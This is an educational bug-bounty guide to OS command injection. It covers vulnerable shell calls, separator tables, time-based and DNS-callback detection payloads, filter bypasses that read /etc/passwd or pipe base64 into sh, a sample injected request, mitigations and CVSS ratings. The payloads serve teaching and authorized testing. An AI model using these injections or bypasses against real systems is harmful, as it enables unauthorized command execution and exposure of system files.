# 📁 OS Command Injection — Security Testing Guide

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Operating System Command Injection directly compromises host operating systems and cloud container environments. Test strictly against authorized targets. **Never execute destructive commands (`rm -rf`, disk wipes), exfiltrate private credentials, or spawn persistent reverse shells.** Verify findings using non-intrusive commands (`id`, `whoami`, `sleep`, or safe DNS callbacks).

---

## 📌 Executive Summary

**Operating System (OS) Command Injection** occurs when an application passes user-supplied input to a system shell (`/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`) to execute underlying system utilities (such as `ping`, `traceroute`, `convert`, `curl`, or `pdf2text`) without properly escaping shell metacharacters or utilizing parameterized process APIs.

### ⚙️ Why It Happens
Consider an IP diagnostics utility in PHP:
```php
// ❌ VULNERABLE: Direct concatenation into system shell
$target_ip = $_POST['ip'];
$output = shell_exec("ping -c 2 " . $target_ip);
echo "<pre>$output</pre>";
```
If an attacker supplies `127.0.0.1; whoami`, the shell executes:
1. `ping -c 2 127.0.0.1`
2. `whoami` (Executing arbitrary commands under the web server's service account!)

---

## 🔍 Command Separators & Metacharacters

Different operating systems and shells interpret separators according to their grammar:

| Metacharacter | Unix / Linux | Windows (cmd / PS) | Execution Behavior |
| :--- | :---: | :---: | :--- |
| `;` | ✅ | ❌ | Sequential execution (runs command 1, then command 2) |
| `&` | ✅ | ✅ | Runs command 1 in background, then immediately runs command 2 |
| `&&` | ✅ | ✅ | Runs command 2 only if command 1 succeeds (`exit code 0`) |
| `\|` | ✅ | ✅ | Pipes output of command 1 into command 2 |
| `\|\|` | ✅ | ✅ | Runs command 2 only if command 1 fails (`exit code != 0`) |
| `\n` (`%0a`) | ✅ | ✅ | Newline character acting as command terminator |
| `` `cmd` `` | ✅ | ❌ | Command substitution (inline evaluation) |
| `$(cmd)` | ✅ | ✅ (PS) | Command substitution (inline evaluation) |

---

## 💡 High-Value Bug Bounty Tips & Filter Bypasses

### 1. Blind Command Injection (Time-Based)
When the application executes commands in background workers or suppresses stdout/stderr from HTTP responses:
- **Unix Delay:** `127.0.0.1; sleep 5` or `127.0.0.1 && sleep 5`
- **Windows Delay:** `127.0.0.1 & timeout /t 5` or `127.0.0.1 & ping -n 6 127.0.0.1`
- **Verification Rule:** Measure the HTTP response round-trip time. If baseline is 100ms and injected payload takes 5,100ms, blind command execution is confirmed.

---

### 2. Blind Command Injection (Out-of-Band / OOB DNS)
If outbound network traffic is permitted from the backend server:
```bash
# Unix DNS Callback
127.0.0.1; nslookup [CANARY_SUBDOMAIN].your-domain.com
127.0.0.1; curl http://[CANARY_SUBDOMAIN].your-domain.com

# Windows DNS Callback
127.0.0.1 & nslookup [CANARY_SUBDOMAIN].your-domain.com
```

---

### 3. Space Character Filter Bypasses
When the backend application filters or trims space characters (` `):

| Technique | Example Syntax | Platform |
| :--- | :--- | :--- |
| **Internal Field Separator (IFS)** | `127.0.0.1;id$IFS` or `127.0.0.1;cat$IFS/etc/passwd` | Linux / Bash |
| **Brace Expansion** | `{cat,/etc/passwd}` | Linux / Bash |
| **Input Redirection (`<`)** | `cat</etc/passwd` | Linux |
| **Tab Character (`%09`)** | `127.0.0.1;id%09` | Linux / Windows |
| **Windows Variables** | `type%PROGRAMFILES:~10,1%` | Windows |

---

### 4. Slash and Keyword Blacklist Bypasses
If forward slash (`/`) or specific keywords (`cat`, `id`, `whoami`) are blacklisted:
- **Base64 Pipe:**
  ```bash
  echo "aWQ=" | base64 -d | sh
  ```
- **String Concatenation in Bash:**
  ```bash
  w'h'o'a'm'i
  w"h"o"a"m"i
  w\ho\am\i
  ```
- **Wildcard Globbing:**
  ```bash
  /usr/bin/p*ng
  /???/???/id
  ```

---

## 🛠️ Safe Educational Verification Template

### Safe HTTP Request Example
```http
POST /api/v1/network/diagnostics HTTP/1.1
Host: example.com
Authorization: Bearer [CONTROLLED_TEST_TOKEN]
Content-Type: application/json

{
  "hostname": "127.0.0.1; id"
}
```

### Vulnerable Response Body
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "completed",
  "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
}
```

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Use Built-in Language APIs (Avoid System Shells)
Never spawn system shells. Programming languages offer native libraries for nearly all system operations (DNS resolution, ping, image resizing, file conversion):
```python
# ❌ VULNERABLE: Spawns shell
os.system(f"ping -c 2 {user_host}")

# ✅ SECURE: Native library without shell
import socket
ip_address = socket.gethostbyname(user_host)
```

### 2. Parameterized Process Spawning
If external command execution is unavoidable, pass arguments as a strict array to process spawning APIs without a shell interpreter:
```python
# ✅ SECURE: subprocess without shell=True
import subprocess

# The arguments list prevents metacharacters from being interpreted as commands
result = subprocess.run(
    ["/bin/ping", "-c", "2", user_host],
    capture_output=True,
    text=True,
    timeout=5,
    check=False
)
```

```java
// ✅ SECURE in Java ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "2", userHost);
Process process = pb.start();
```

### 3. Strict Input Allowlisting
If input must represent an IP or hostname, validate using strict regex or typed parsers:
```python
import ipaddress

def validate_ip(user_input):
    # Throws ValueError if input contains any shell metacharacters or invalid IP format
    return str(ipaddress.ip_address(user_input))
```

---

## 📊 CVSS 3.1 Severity Reference

- **Unauthenticated Command Injection (Root / System Context):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (Score: **10.0 - Critical**)
- **Authenticated Command Injection (Web Service Account `www-data`):** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (Score: **9.9 - Critical**)
- **Blind Time-Based Command Injection:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (Score: **9.9 - Critical**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Target host and endpoint are confirmed in scope.
- [ ] Used strictly non-destructive proofs-of-concept (`id`, `whoami`, `sleep 5`).
- [ ] Tested multiple command separators (`;`, `&`, `&&`, `|`, `\n`).
- [ ] Confirmed execution in response body or recorded verifiable time delay evidence.
- [ ] Stopped immediately upon verifying command execution without pivoting into internal networks.
